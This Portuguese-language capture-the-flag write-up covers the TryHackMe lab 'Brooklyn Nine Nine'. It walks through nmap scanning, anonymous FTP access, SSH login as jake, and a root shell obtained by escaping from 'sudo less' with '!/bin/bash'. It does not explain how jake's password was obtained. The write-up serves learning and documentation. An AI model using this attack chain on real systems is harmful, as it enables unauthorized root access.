# 🕵️ Brooklyn Nine Nine — TryHackMe Write-up

> ⚠️ **Aviso:** Este documento contém spoilers e a solução da máquina. Use apenas em ambientes autorizados, como o laboratório do TryHackMe.

## 📌 Informações da Sala

* **Plataforma:** TryHackMe
* **Sala:** Brooklyn Nine Nine
* **IP da máquina:** `10.67.135.191`
* **Dificuldade:** Easy
* **Objetivos:** Enumeration → Initial Access → Privilege Escalation → Flags

---

## 🗺️ Resumo da Exploração

```text
Nmap
  ↓
Portas 21, 22 e 80
  ↓
FTP Anonymous Login
  ↓
note_to_jake.txt
  ↓
Usuário: jake
  ↓
SSH
  ↓
sudo -l
  ↓
/usr/bin/less com NOPASSWD
  ↓
Shell como root
  ↓
root.txt
```

---

# 1. 🔎 Reconhecimento

Inicialmente foi realizado um scan utilizando Nmap:

```bash
nmap -sS 10.67.135.191
```

Inicialmente todas as portas apareceram como `filtered`, pois a Kali ainda não estava corretamente conectada à VPN do TryHackMe.

Após estabelecer a conexão com a VPN, foi realizado um novo scan:

```bash
nmap -sS -p- 10.67.135.191
```

Foram encontradas as seguintes portas:

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Enumeração de versões

```bash
nmap -sC -sV -p21,22,80 10.67.135.191
```

A porta **21/FTP** chamou atenção por permitir acesso anônimo.

---

# 2. 📂 Enumeração do FTP

Foi realizada uma conexão:

```bash
ftp 10.67.135.191
```

Foi possível autenticar utilizando:

```text
Username: anonymous
```

Após o login:

```text
230 Login successful.
```

Foi executado:

```text
ls
```

O servidor retornou:

```text
-rw-r--r--    1 0 0 119 May 17 2020 note_to_jake.txt
```

O arquivo foi baixado:

```text
get note_to_jake.txt
```

---

# 3. 📝 Descoberta do usuário Jake

O conteúdo do arquivo era:

```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

A mensagem revelou algumas informações importantes:

* Usuário: `jake`
* Referência a `holt`
* Referência a "nine nine"
* Indicação de que a senha de Jake era fraca

A existência do usuário `jake` foi posteriormente confirmada através do acesso SSH.

---

# 4. 🔑 Initial Access — SSH

Com o usuário descoberto, foi possível acessar o serviço SSH:

```bash
ssh jake@10.67.135.191
```

Após autenticar, foi obtido acesso ao sistema como:

```text
jake
```

Foi realizada uma enumeração inicial:

```bash
whoami
```

Resultado:

```text
jake
```

Também foi analisado o diretório pessoal:

```bash
ls -la
```

Entre os arquivos encontrados estava:

```text
.ssh/
```

---

# 5. 🔐 Enumeração do SSH

Dentro do diretório `.ssh` foram encontrados:

```text
id_rsa
id_rsa.pub
```

A chave pública foi analisada:

```bash
cat ~/.ssh/id_rsa.pub
```

O comentário da chave continha:

```text
jake@brookly_nine_nine
```

Isso reforçou a identificação do host e a temática da máquina.

---

# 6. 🚨 Privilege Escalation

O próximo passo foi verificar os privilégios sudo:

```bash
sudo -l
```

O resultado foi:

```text
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Esse foi o ponto principal da privilege escalation.

O usuário `jake` podia executar:

```text
/usr/bin/less
```

como qualquer usuário, incluindo `root`, sem fornecer senha.

---

# 7. 💥 Exploração do `less`

O `less` possui uma funcionalidade que permite executar comandos externos.

Foi executado:

```bash
sudo less /etc/hosts
```

Dentro do `less`, foi utilizado:

```text
!/bin/bash
```

Isso abriu um shell com privilégios elevados.

Foi então verificado:

```bash
whoami
```

Resultado:

```text
root
```

Foi obtido então um **root shell**.

---

# 8. 🏴 Root Flag

Com acesso root, foi realizada uma busca pela flag:

```bash
find / -name "root.txt" 2>/dev/null
```

Resultado:

```text
/root/root.txt
```

A flag pode ser lida utilizando o caminho absoluto:

```bash
cat /root/root.txt
```

---

# 9. 🏴 User Flag

Para procurar a flag do usuário:

```bash
find / -type f -name "user.txt" 2>/dev/null
```

Caso a sala utilize outro nome ou localização para a flag, também pode ser feita uma busca mais ampla:

```bash
find / -type f \( -iname "*user*" -o -iname "*flag*" \) 2>/dev/null
```

---

# 🔐 Vulnerabilidades / Misconfigurations

A máquina apresentou principalmente duas configurações inseguras.

## 1. FTP Anonymous Login

O servidor FTP permitia acesso utilizando:

```text
anonymous
```

Isso possibilitou acessar arquivos sem credenciais legítimas.

O arquivo:

```text
note_to_jake.txt
```

forneceu informações úteis para obter acesso inicial.

## 2. Sudo com `less`

A configuração:

```text
(ALL) NOPASSWD: /usr/bin/less
```

permitia que `jake` executasse o `less` como `root`.

Como o `less` possui capacidade de executar comandos externos, isso permitiu obter um shell privilegiado.

---

# 🧠 O que aprendi

Essa máquina demonstra um fluxo clássico de pentest:

```text
Reconhecimento
     ↓
Enumeração
     ↓
Identificação de serviço vulnerável
     ↓
Information Disclosure
     ↓
Initial Access
     ↓
Privilege Enumeration
     ↓
Privilege Escalation
```

Principais aprendizados:

* Uso do Nmap para descoberta de portas.
* Enumeração de serviços FTP.
* Identificação de acesso anônimo.
* Análise de arquivos encontrados em serviços expostos.
* Uso de SSH para acesso inicial.
* Importância do `sudo -l` durante privilege escalation.
* Identificação de binários perigosos permitidos via `sudo`.
* Uso de GTFOBins para verificar possibilidades de escape de binários autorizados pelo sudo.

---

# 🛠️ Ferramentas Utilizadas

```text
Kali Linux
Nmap
FTP
SSH
Linux CLI
sudo
less
```

---

# 📚 Comandos Principais

```bash
# Port scanning
nmap -sS -p- 10.67.135.191

# Service enumeration
nmap -sC -sV -p21,22,80 10.67.135.191

# FTP
ftp 10.67.135.191

# Download
get note_to_jake.txt

# SSH
ssh jake@10.67.135.191

# User enumeration
whoami
id

# Sudo enumeration
sudo -l

# Privilege escalation
sudo less /etc/hosts

# Shell
!/bin/bash

# Verify root
whoami

# Search flags
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
```

---

# 🏁 Conclusão

A exploração da **Brooklyn Nine Nine** começou com a enumeração dos serviços expostos.

O acesso anônimo ao FTP permitiu obter uma mensagem contendo informações sobre o usuário `jake`. Com essas informações, foi possível obter acesso via SSH.

Após o acesso inicial, a enumeração de privilégios com:

```bash
sudo -l
```

revelou que `jake` podia executar:

```text
/usr/bin/less
```

como `root` sem senha.

A capacidade do `less` de executar comandos externos permitiu obter um shell privilegiado e concluir a escalada para `root`.

## 🔥 Attack Chain

```text
FTP Anonymous
      ↓
Information Disclosure
      ↓
SSH Access
      ↓
sudo -l
      ↓
less
      ↓
Privilege Escalation
      ↓
ROOT
```

---

## 📌 Flags

> As flags não são incluídas neste README para evitar expor diretamente as respostas da sala.

* [ ] User Flag
* [ ] Root Flag

---

**TryHackMe — Brooklyn Nine Nine**

*Write-up criado para fins educacionais e documentação de aprendizado em cybersecurity.*
